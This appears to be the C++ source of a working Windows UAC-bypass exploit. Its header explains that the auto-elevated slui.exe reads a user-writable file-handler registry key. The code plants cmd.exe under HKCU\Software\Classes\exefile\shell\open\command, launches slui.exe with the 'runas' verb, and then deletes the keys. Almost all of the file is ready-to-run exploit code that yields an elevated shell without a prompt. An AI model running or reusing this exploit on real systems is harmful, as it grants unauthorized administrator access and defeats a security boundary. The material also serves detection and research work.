/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Slui File Handler Hijack UAC Bypass Local Privilege Escalation                     ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/slui-file-handler-hijack-privilege-escalation               ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   slui.exe is an auto-elevated binary that is vulnerable to file handler             ║
 * ║   hijacking.                                                                         ║
 * ║                                                                                      ║
 * ║   Read access to HKCU\Software\Classes\exefile\shell\open is performed upon          ║
 * ║   execution. Due to the registry key being accessible from user mode, an arbitrary   ║
 * ║   executable file can be provided.                                                   ║
 * ║                                                                                      ║
 * ║   This exploit is generally independent from programming language and bitness, as    ║
 * ║   no DLL injection or privileged file copy is needed. In addition, if default        ║
 * ║   system binaries suffice, file drops can be avoided altogether.                     ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <string>
#include <Windows.h>
using namespace std;

void CreateRegistryKey(HKEY key, wstring path, wstring name);
void DeleteRegistryKey(HKEY key, wstring path, wstring name);
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Create Class "exefile" in HKCU

	// HKEY_CURRENT_USER
	//   Software
	//     Classes
	//       exefile
	//         shell
	//           open
	//             command
	//               @=Payload     <-- cmd.exe is used here, can be any executable

	// Create registry tree
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");

	// Set payload to cmd.exe
	// Any executable can be used. File drops can, however, be avoided completely if system binaries suffice.
	SetRegistryValue(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Windows\\System32\\cmd.exe");

	// Start slui.exe with "runas" verb
	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);

	// Wait some time until it finished loading
	Sleep(1000);

	// Delete registry keys, but only from \Software\Classes\exefile\shell to not interfere with other application handlers
	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	return 0;
}



void CreateRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}
void DeleteRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}